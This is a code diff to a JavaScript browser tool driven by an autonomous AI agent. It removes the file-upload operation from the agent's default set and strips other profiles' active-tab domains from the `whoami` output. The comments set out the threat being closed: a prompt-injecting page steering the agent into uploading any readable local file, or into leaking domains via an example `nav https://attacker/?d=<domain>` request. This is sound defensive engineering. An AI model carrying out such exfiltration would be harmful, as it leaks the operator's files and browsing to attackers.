@@ -62,18 +62,25 @@ export const OP_TO_SERVER = Object.freeze({
   whoami: "whoami",
 });
 
-// `upload` populates an <input type=file> with a file at a caller-chosen PATH via
-// CDP DOM.setFileInputFiles. EXFIL TRADEOFF (explicit operator decision): the agent
-// may supply ANY path — there is NO path allowlist here. Chrome reads the file by
-// path itself (same host), so no bytes route through the agent, but the CONTENTS of
-// any readable file could be posted to the target site. This is accepted; it is made
-// safe-to-audit rather than blocked: the SERVER audit-logs EVERY upload (op + target
-// domain + path). Still a bounded TYPED op — only selector/path/frame reach the wire
-// (buildRequest whitelists them); no raw-CDP/method/params passthrough. Own-tab-scoped
-// (the tab is forced by env), like every other op.
+// The AUTONOMOUS model's DEFAULT op set — 11 ops, identical to browser.js's typed
+// `op` enum, the agent-md capability table, and the README's published contract.
+// Keep those four in lockstep (tests/browser_tool.test.mjs parses all four and
+// asserts they match, so a drift fails CI).
+//
+// `upload` is DELIBERATELY ABSENT here. It populates an <input type=file> from a
+// caller-chosen ABSOLUTE PATH via CDP DOM.setFileInputFiles, with NO path
+// allowlist: Chrome reads the file by path itself (same host, no bytes cross the
+// bridge), but the CONTENTS of any readable file could be posted to the target
+// site. That exfil tradeoff is acceptable for the OPERATOR driving the `browser`
+// CLI by hand (deliberate, audit-logged, human-chosen path) — it is NOT acceptable
+// as a default for a cheap model that is by design pointed at untrusted,
+// prompt-injecting pages, where the "caller" choosing the path can effectively be
+// the page. `upload` stays in OP_TO_SERVER so it remains REACHABLE, but only via
+// an explicit, deliberate `BROWSER_AGENT_ALLOWED_OPS` opt-in (documented in the
+// README) — never by default, and never by anything the model can set itself.
 export const ALLOWED_OPS_DEFAULT = Object.freeze([
   "text", "html", "eval", "nav", "screenshot",
-  "frames", "click", "type", "key", "activate", "upload", "whoami",
+  "frames", "click", "type", "key", "activate", "whoami",
 ]);
 
 export const TEXT_MAX_BYTES_DEFAULT = 32768;
@@ -145,6 +152,11 @@ export function hostDenied(host, allowList, denyList) {
   return false;
 }
 
+// BROWSER_AGENT_ALLOWED_OPS — the operator's explicit op-set override (a space/
+// comma separated list). Unset/empty → ALLOWED_OPS_DEFAULT (the 11-op browser-only
+// set). Set → it REPLACES the default wholesale, so it can both narrow the agent
+// (`"text,html"`) and deliberately re-enable an off-by-default op such as `upload`.
+// It is read from the wrapper's environment, which the MODEL cannot influence.
 export function allowedOpsFromEnv(env) {
   const raw = _list(env.BROWSER_AGENT_ALLOWED_OPS);
   return raw.length ? raw : [...ALLOWED_OPS_DEFAULT];
@@ -273,8 +285,10 @@ export function buildRequest(args, env, token) {
     }
   } else if (op === "upload") {
     // Populate a file input. TYPED scalars only: selector + path (+ optional frame).
-    // ANY path is allowed for the agent (the explicit exfil tradeoff above); the
-    // server audit-logs every upload. Only these fields reach the wire — a smuggled
+    // NOT in ALLOWED_OPS_DEFAULT — unreachable unless the operator explicitly opts
+    // in via BROWSER_AGENT_ALLOWED_OPS (see the note on ALLOWED_OPS_DEFAULT). When
+    // opted in, ANY path is allowed (the explicit exfil tradeoff) and the server
+    // audit-logs every upload. Only these fields reach the wire — a smuggled
     // cdp/method/params is dropped (the whitelist build below).
     if (!args || !args.selector) throw new BrowserToolRefusal("upload_missing_selector");
     if (!args.path) throw new BrowserToolRefusal("upload_missing_path");
@@ -301,7 +315,13 @@ export function buildRequest(args, env, token) {
 
 // Pull a compact, model-facing string out of the server's 200 envelope. NEVER
 // dumps a base64 screenshot blob into the model context.
-export function summarizeResult(op, envelope) {
+//
+// `env` is only consulted by `whoami`, to narrow the instance list to the agent's
+// OWN forced instance (see that branch). It defaults to {} so every other op — and
+// every existing caller/test — is unaffected; an absent env simply means "no
+// instance forced", which is already the safe shape (no browsing domains are ever
+// emitted regardless).
+export function summarizeResult(op, envelope, env = {}) {
   const data = (envelope && envelope.data) || {};
   if (op === "text") return typeof data.text === "string" ? data.text : JSON.stringify(data);
   if (op === "html") return typeof data.html === "string" ? data.html : JSON.stringify(data);
@@ -349,23 +369,55 @@ export function summarizeResult(op, envelope) {
   }
   if (op === "whoami") {
     // Identity + diagnostics. `envelope` IS the whole whoami object (no .data).
-    // METADATA ONLY — host label, instance labels, active-tab DOMAINs, versions;
-    // NO page content, NO full URLs.
+    // METADATA ONLY, and NARROWED to the op's stated purpose: "which HOST and
+    // which PROFILE am I on". No page content, no full URLs, and — critically —
+    // no reconnaissance of the OPERATOR'S OTHER PROFILES.
+    //
+    // Two fields the server returns are deliberately DROPPED here:
+    //
+    //  1. `activeTabDomain`, on every instance. The server's whoami_snapshot
+    //     iterates ALL live instances, so a bare passthrough tells the model what
+    //     the operator is browsing in unrelated profiles (e.g. a `banking` profile
+    //     sitting on chase.com while the agent runs on `work`). With no
+    //     --allow-domains set, hostDenied() permits any host, so that is one
+    //     `nav https://attacker/?d=<domain>` away from exfil — by a model that is
+    //     by design reading untrusted, prompt-injecting pages. This is exactly the
+    //     leak the OP_TO_SERVER comment cites as the reason `tabs` is excluded
+    //     ("`tabs` would leak other tabs' URLs"); whoami reintroduced a narrower
+    //     version of it. Dropped unconditionally — the agent never needs to know
+    //     what any tab, including its own, is pointed at (it can read its own).
+    //  2. The git HEAD inside `server_version` ({version, git:<short sha>}). Only
+    //     the human-facing `version` survives; the commit sha is host-internal
+    //     state with no bearing on "which profile am I on".
+    //
+    // The instance list is also FILTERED to the agent's own forced instance
+    // (BROWSER_AGENT_INSTANCE — the same value buildRequest sends as `target`,
+    // set by the wrapper, unsettable by the model). The wrapper accepts either an
+    // auto key or a label there, so match either. If an instance is forced and
+    // nothing matches, return an empty list rather than falling back to "all" —
+    // failing closed on reconnaissance. When no instance is forced (the bridge
+    // auto-routes) the list is left as-is; it then carries only key/label/version,
+    // never a browsing domain.
     const w = envelope || {};
     const host = w.host || {};
     const bridge = w.bridge || {};
     const instances = Array.isArray(w.instances) ? w.instances : [];
+    const sv = bridge.server_version;
+    const own = String(env.BROWSER_AGENT_INSTANCE ?? "").trim();
+    const mine = own
+      ? instances.filter((i) => i.key === own || i.label === own)
+      : instances;
     return JSON.stringify({
       host: { label: host.label ?? null, source: host.source ?? null },
       bridge: {
         endpoint: bridge.endpoint ?? null,
         connected: bridge.connected ?? null,
-        server_version: bridge.server_version ?? null,
+        // Drop the git HEAD: keep only the human-facing version string.
+        server_version: (sv && typeof sv === "object" ? sv.version : sv) ?? null,
         extension_version_current: bridge.extension_version_current ?? null,
       },
-      instances: instances.map((i) => ({
+      instances: mine.map((i) => ({
         key: i.key ?? null, label: i.label ?? null,
-        activeTabDomain: i.activeTabDomain ?? null,
         extension_version: i.extension_version ?? null,
       })),
     });
@@ -466,7 +518,7 @@ export async function runBrowserOp(args, opts = {}) {
   }
   // whoami returns the diagnostic object DIRECTLY ({ok,host,bridge,instances}) —
   // there is no {result:<envelope>} wrapper like /cmd. Summarize it as-is.
-  if (op === "whoami") return summarizeResult("whoami", outer);
+  if (op === "whoami") return summarizeResult("whoami", outer, env);
   const envelope = outer && outer.result;
   if (envelope && envelope.ok === false) {
     // An op-level failure in the page (e.g. owned_tab_gone) — surface to the model.
